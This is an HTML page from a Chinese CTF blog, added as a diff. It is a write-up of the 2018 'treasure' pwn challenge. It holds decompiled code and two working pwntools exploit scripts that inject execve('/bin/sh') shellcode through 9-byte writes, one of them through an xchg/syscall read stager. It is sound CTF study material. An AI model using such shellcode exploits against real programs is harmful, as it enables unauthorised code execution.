@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>好靶场 | JerryXie&#39;s Blog</title>
+<meta name="description" content="CTF, digital forensics, offensive security, and study notes.">
+<meta name="theme-color" content="#f5f5f7">
+<meta name="referrer" content="no-referrer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="好靶场 | JerryXie&#39;s Blog">
+<meta property="og:description" content="CTF, digital forensics, offensive security, and study notes.">
+
+  <meta property="og:url" content="https://jerryxie.top/notes/ctf/好靶场/">
+  <link rel="canonical" href="https://jerryxie.top/notes/ctf/好靶场/">
+
+
+  <meta name="author" content="JerryXie">
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="/js/main.js"></script>
+
+  <meta name="generator" content="Hexo 8.1.1"></head>
+  <body>
+    <div class="scroll-progress" data-scroll-progress></div>
+    <div class="site-shell">
+      
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark"></span>
+      <span class="brand-name">JerryXie&#39;s Blog</span>
+    </a>
+
+    <button class="menu-toggle" type="button" data-menu-toggle aria-label="Toggle navigation">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" data-menu-panel>
+      
+        <a href="/" class="">Home</a>
+      
+        <a href="/archives/" class="">Archive</a>
+      
+        <a href="/categories/" class="">Library</a>
+      
+        <a href="/about/" class="">About</a>
+      
+    </nav>
+
+    <button class="theme-toggle" type="button" data-theme-toggle aria-label="Toggle theme">
+      <span data-theme-icon>Dark</span>
+    </button>
+  </div>
+</header>
+
+      <main class="page-shell">
+        
+
+<article class="article-layout">
+  <div class="article-main card-panel">
+    <a class="back-link" href="/categories/">Back to library</a>
+    <header class="article-header">
+      <div class="article-badges">
+        
+          
+            <a class="category-chip" href="/categories/ctf/">ctf</a>
+          
+        
+      </div>
+      <h1>好靶场</h1>
+      <div class="article-meta">
+        <span>Published 2026-04-19</span>
+        <span>Updated 2026-04-19</span>
+        <span>7 min</span>
+      </div>
+      
+        <p class="article-source">Source path: <code>ctf/好靶场.md</code></p>
+      
+    </header>
+
+    <div class="article-content">
+      <h2 id="鹏城杯-2018-treasure"><a href="#鹏城杯-2018-treasure" class="headerlink" title="鹏城杯_2018_treasure"></a><strong>鹏城杯_2018_treasure</strong></h2><p>好玩啊好玩</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/E/CTF/pwn学习/好靶场/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">    Stripped:   No</span><br><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 <span class="params">(SYSV)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=<span class="number">2</span>c4290d9d42f57413374e2c8a0d440a842ddace8, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>64位，NX开，Partial RELRO</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  settreasure(argc, argv, envp);</span><br><span class="line">  treasure();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">settreasure</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sea = (__int64)mmap(<span class="number">0</span>, <span class="number">0x1000u</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  code = mmap(<span class="number">0</span>, <span class="number">0x1000u</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v5 = rand() % <span class="number">900</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(sea + v5), <span class="string">&quot;TREASURE&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(sea + v5), &amp;shellcode, <span class="number">0x26u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(&amp;shellcode, <span class="number">0</span>, <span class="number">0x25u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>settreasure这个函数就是唬人的函数</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">treasure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 n_n_; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want my treasure? Find them yourself! It&#x27;s shellcode!\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  make_code_executable(code, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>, code, <span class="number">1u</span>);</span><br><span class="line">    n_n_ = *(<span class="type">unsigned</span> __int8 *)code;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)n_n_ == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start!!!!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    getsn((<span class="type">char</span> *)code + <span class="number">1</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)code + <span class="number">10</span>) )</span><br><span class="line">      <span class="built_in">memcpy</span>((<span class="type">char</span> *)code + <span class="number">10</span>, &amp;src_, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">      <span class="comment">// .rodata:0000000000400C2A C3                                src_ db 0C3h  </span></span><br><span class="line">      <span class="comment">// ret的机器码</span></span><br><span class="line">    ret = ((__int64 (__fastcall *)(_QWORD))((<span class="type">char</span> *)code + <span class="number">1</span>))((<span class="type">unsigned</span> <span class="type">int</span>)ret);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n_n_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检测code第一个字节是不是n，是n则退出。读取接下来9字节，并存储，最后自动附上ret。我们先来动调一下：</p>
+<p>我这里敲了回车，rax指向并存入了一块可读可写可执行的区域</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1775104684474-16a993a7-ada1-44fc-b772-4b6e1eacfad0.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>然后可以循环执行，查看栈上信息，发现他的的确确写上去了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1775104920918-1557b44c-5bf1-428c-b162-7950865a71a8.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><p>参考&#x2F;优化：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16505355.html">BUUCTF_鹏城杯_2018_treasure - ZikH26 - 博客园</a></p>
+<p>这里我们有第一个办法，每次只能写入9字节，所以把64位shellcode拆成很多份，每次传入9字节以内的shellcode，最后跳转执行。发现rdx指向的是那个rwx的地址，所以用</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push <span class="title function_">shellcode_gadget</span><span class="params">(每次<span class="number">1</span>个字节)</span></span><br><span class="line">pop rdx+0<span class="title function_">x20</span><span class="params">(这里给一点偏移量，在rwx的区间即可，每次循环向后移<span class="number">1</span>字节即可)</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1775105242421-05636e71-2d8c-4fd2-9257-b7b99b5b90c7.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 64位shellcode</span></span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;xor esi, esi</span></span><br><span class="line"><span class="string">    push rsi</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 59</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    cdq</span></span><br><span class="line"><span class="string">    syscall&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly">Online x86 and x64 Intel Instruction Assembler</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1775107629865-c8c71cfc-331b-4641-a870-c88030ab64bf.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">r&#x27;/mnt/hgfs/E/CTF/pwn学习/好靶场/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">asm_code = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x31</span></span><br><span class="line"><span class="string">pop qword ptr [rdx+0x20]</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,asm_code)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\x6A\x3B\x58\x99\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, byte_val <span class="keyword">in</span> <span class="built_in">enumerate</span>(shellcode):</span><br><span class="line">    <span class="comment"># 获取字节的十六进制表示</span></span><br><span class="line">    hex_byte = <span class="built_in">hex</span>(byte_val)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成汇编代码</span></span><br><span class="line">    asm_code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;hex_byte&#125;</span></span></span><br><span class="line"><span class="string">    pop [rdx+<span class="subst">&#123;i+<span class="number">0x21</span>&#125;</span>]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,asm_code)</span><br><span class="line"><span class="comment"># 跳转执行</span></span><br><span class="line">asm_code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    add rdx,0x20</span></span><br><span class="line"><span class="string">    jmp rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,asm_code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>这里引入一个汇编：xchg，即交换两个寄存器的值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1775109706870-32323000-530f-45df-bfa4-b61c037ab86c.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0</span><br><span class="line">rdx = code+1</span><br><span class="line">rsi = 0x400c2a 指向ret</span><br><span class="line">rdi = 0</span><br></pre></td></tr></table></figure>
+
+<p>此时如果说把rsi和rdx两个值交换，之后syscall（rax此时是0，不就是read的系统调用吗）</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read(<span class="built_in">int</span> fd, void * buf, size_t count);</span><br><span class="line">read(rdi, rsi, rdx)</span><br><span class="line">rdx = <span class="number">0x400c2a</span> 指向ret</span><br><span class="line">rsi = code+<span class="number">1</span> </span><br><span class="line">rdi = <span class="number">0</span></span><br><span class="line">read(<span class="number">0</span>, <span class="number">0x7f40cde4a001</span>, <span class="number">0x400c2a</span>)</span><br></pre></td></tr></table></figure>
+
+<p>就可以读取写入的shellcode：</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">r&#x27;/mnt/hgfs/E/CTF/pwn学习/好靶场/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stage1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xchg rdx, rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>, stage1)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span> + asm(shellcraft.execve(<span class="string">&quot;/bin/sh&quot;</span>)))</span><br><span class="line"><span class="comment"># 当然不确定要跳过多长的话写成这样也可以:</span></span><br><span class="line"><span class="comment"># p.sendline(b&#x27;\x90&#x27;*10 + asm(shellcraft.execve(&quot;/bin/sh&quot;)))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为rsi指向ret所以也可以这样写</span></span><br><span class="line">xchg rdx, rsi</span><br><span class="line">syscall</span><br><span class="line">call rsi</span><br></pre></td></tr></table></figure>
+
+<p>把上述信息搞懂之后就可以用各种花里胡哨的东西了，只要不超过9字节：</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rdx</span><br><span class="line">push <span class="number">100</span></span><br><span class="line">pop rdx</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push rdx</span><br><span class="line">pop rsi</span><br><span class="line">push <span class="number">100</span></span><br><span class="line">pop rdx</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+    </div>
+  </div>
+
+  <aside class="article-side">
+    <div class="card-panel sticky-panel">
+      <h3>Outline</h3>
+      
+        <div class="toc-shell"><ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-treasure"><span class="toc-list-text">鹏城杯_2018_treasure</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-list-text">法一：</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-list-text">法二</span></a></li></ol></div>
+      
+    </div>
+
+    
+      <div class="card-panel sticky-panel">
+        <h3>More from ctf</h3>
+        <div class="mini-list">
+          
+            <a href="/notes/ctf/_CTF/">
+              <strong>_CTF</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/_CTF/Week_1/">
+              <strong>Week_1</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/">
+              <strong>2025_SWPU-NSSCTF_秋季招新入门训练赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/%E8%BF%98%E5%9C%A8%E5%86%99%E3%80%82CopperSmith%E7%AE%97%E6%B3%95/">
+              <strong>还在写。CopperSmith算法</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </aside>
+</article>
+
+      </main>
+      
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <strong>JerryXie&#39;s Blog</strong>
+      <p>CTF, digital forensics, offensive security, and study notes.</p>
+    </div>
+    <div class="footer-meta">
+      <span>Hexo</span>
+      <span class="dot"></span>
+      <a href="https://github.com/JerryXie599/jerryxie599.github.io" target="_blank" rel="noopener">GitHub</a>
+      <span class="dot"></span>
+      <a href="https://jerryxie.top/" target="_blank" rel="noopener">Live</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
